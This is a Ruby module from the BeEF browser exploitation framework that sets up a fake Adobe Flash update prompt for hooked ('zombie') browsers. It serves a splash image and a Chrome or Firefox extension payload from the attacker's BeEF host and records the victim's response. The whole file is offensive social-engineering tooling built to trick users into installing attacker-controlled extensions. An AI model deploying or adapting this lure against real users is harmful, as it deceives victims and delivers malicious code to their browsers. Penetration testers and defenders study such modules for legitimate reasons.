#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Fake_flash_update < BeEF::Core::Command
  
  def self.options
    configuration = BeEF::Core::Configuration.instance
    payload_root = "http://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}"
    image = "http://#{configuration.get("beef.http.host")}:#{configuration.get("beef.http.port")}/demos/adobe_flash_update.png"

    return [
        {'name' =>'image', 'description' =>'Location of image for the update prompt', 'ui_label'=>'Splash image', 'value' => image},
        {'name' =>'payload_root', 'description' =>'BeEF (Payload) root path', 'ui_label'=>'BeEF (Payload) root path', 'value' => payload_root},
        { 'name' => 'payload', 'type' => 'combobox', 'ui_label' => 'Payload', 'store_type' => 'arraystore',
          'store_fields' => ['payload'], 'store_data' => [['Chrome_Extension'],['Firefox_Extension']],
          'valueField' => 'payload', 'displayField' => 'payload', 'mode' => 'local', 'autoWidth' => true
        }

    ]
  end
  
  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    save({'answer' => @datastore['answer']})
  end
  
end
